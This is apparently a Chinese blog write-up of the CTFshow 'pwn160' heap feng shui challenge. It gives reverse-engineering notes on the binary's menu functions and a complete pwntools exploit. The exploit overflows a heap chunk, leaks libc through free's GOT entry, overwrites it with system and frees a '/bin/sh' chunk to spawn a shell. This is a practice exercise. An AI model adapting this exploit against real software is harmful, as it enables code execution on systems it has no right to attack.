---
title: CTFshow pwn160
tags:
    - pwn
    - 堆风水
categories:
    - 做题笔记
cover: /img/治不开心药.png
---
# CTFshow pwn160(堆风水)

## ida分析 

### main函数分析
![1741933551272.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png)
1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向

### add函数分析            
![1741933652418.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png)
1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。
2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。
3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。
4.然后这里调用edit去编辑堆块内容

### edit函数分析
![1741934774792.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png)
1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。

### show函数分析
![1741935092305.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png)
1.唯一的作用就是泄露libc

### delete函数分析
![1741935146434.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png)
1.没有uaf，不能直接利用

### gdb分析
![1741934513485.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png)
1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解

## 构造思路
1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。
2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。
3.最后delete一块内容为`/bin/sh\x00`的堆块就可以打通了.

## exp
### 比较复杂的解法
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='i386',log_level='debug')
mode=1
url='pwn.challenge.ctf.show'
port=28252
elf=ELF("./pwn")
if mode == 0:
    io=process("./pwn")
else :
    io=remote(url,port)

def add(size,name,lenth,content):
    io.recvuntil("Action: ")
    io.sendline("0")
    io.recvuntil("size of description: ")
    io.sendline(str(size))
    io.recvuntil("name: ")
    io.sendline(name)
    io.recvuntil("text length: ")
    io.sendline(str(lenth))
    io.recvuntil("text: ")
    io.sendline(content)

def delete(idx):
    io.recvuntil("Action: ")
    io.sendline("1")
    io.recvuntil("")
    io.sendline(str(idx))

def show(idx):
    io.recvuntil("Action: ")
    io.sendline("2")
    io.recvuntil("")
    io.sendline(str(idx))

def edit(idx,lenth,content):
    io.recvuntil("Action: ")
    io.sendline("3")
    io.recvuntil("index: ")
    io.sendline(str(idx))
    io.recvuntil("text length: ")
    io.sendline(str(lenth))
    io.recvuntil("text: ")
    io.sendline(content)

add(0x10,b"a",0x8,b'hhhh')  #0
add(0x20,b"b",0x8,b'hhhh')  #1
add(0x20,b"c",0x8,b'hhhh')  #2
add(0x20,b"d",0x10,b'/bin/sh\x00')  #3
delete(2)  
delete(0)

add(0x10,b"d",0x40,b'aaaa') #4
add(0x80,b'e',0x8,b'bbbb')  #5
free_got=elf.got['free']
payload=p32(0)*5+p32(0x89)
payload+=p32(0)*16
payload+=p32(0x88)+p32(0x28)
payload+=p32(0)*9+p32(0x89)
payload+=p32(0)*4
payload+=p32(0x88)+p64(0x29)
payload+=p32(0)*8+p32(0x89)
payload+=p32(free_got)
edit(4,len(payload),payload)
show(1)
io.recvuntil("description: ")
free=u32(io.recv(4))
log.success('free-{}'.format(hex(free)))
#gdb.attach(io)
libc=LibcSearcher("free",free)
libcbase=free-libc.dump('free')
system=libcbase+libc.dump('system')
edit(1,0x4,p32(system))
#gdb.attach(io)
delete(3)
io.interactive()
```
现在看来，delete(2)似乎有点多余了